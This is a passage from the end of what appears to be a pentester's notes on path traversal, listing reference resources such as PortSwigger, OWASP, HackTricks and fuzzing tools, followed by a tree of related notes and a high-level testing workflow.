                  │ Minimal Evidence      │
                  └───────────┬───────────┘
                              │
                              ▼
                  ┌───────────────────────┐
                  │ Report                │
                  └───────────────────────┘
```

---

# References

## PortSwigger Web Security Academy

### Path Traversal

https://portswigger.net/web-security/file-path-traversal

PortSwigger provides practical path traversal methodology and labs covering basic traversal, absolute paths, nested sequences, encoding and validation bypass scenarios.

---

## OWASP Web Security Testing Guide

### Testing Directory Traversal File Include

https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Input_Validation_Testing/01-Testing_Directory_Traversal_File_Include

OWASP provides methodology for identifying path traversal and file inclusion vulnerabilities.

---

## PayloadsAllTheThings

### Directory Traversal

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal

Useful reference covering traversal syntax, encoding variations and platform-specific behaviour.

Payload collections should be used after understanding the application's path handling rather than as the first testing step.

---

## HackTricks

### File Inclusion / Path Traversal

https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html

Additional practical reference covering path traversal and file inclusion techniques.

---

## ffuf

### ffuf

https://github.com/ffuf/ffuf

Fast web fuzzer that can be useful for targeted path traversal payload testing.

---

## DotDotPwn

### Directory Traversal Fuzzer

https://github.com/wireghoul/dotdotpwn

Specialised tool for testing directory traversal behaviour.

---

# Related Notes

```text
Web Application Security
├── Methodology
├── Pentesting Checklist
├── Reconnaissance
│   ├── Subdomain Enumeration
│   ├── Technology Identification
│   ├── Content Discovery
│   ├── Parameter Discovery
│   └── JavaScript Analysis
├── Authentication
├── Authorisation
├── Session Management
├── Burp Suite
│   ├── Extensions
│   └── Testing Workflows
├── Cross-Site Scripting
├── SQL Injection
├── OS Command Injection
├── Server Side Request Forgery
├── XML External Entity Injection
└── Path Traversal
```

The following notes are particularly relevant when testing path traversal:

```text
Parameter Discovery
      ↓
Find path-like parameters

JavaScript Analysis
      ↓
Discover hidden download endpoints

Burp Suite
      ↓
Manually manipulate file requests

Path Traversal
      ↓
Determine filesystem access

Authorisation
      ↓
Determine whether other users' files are accessible
```
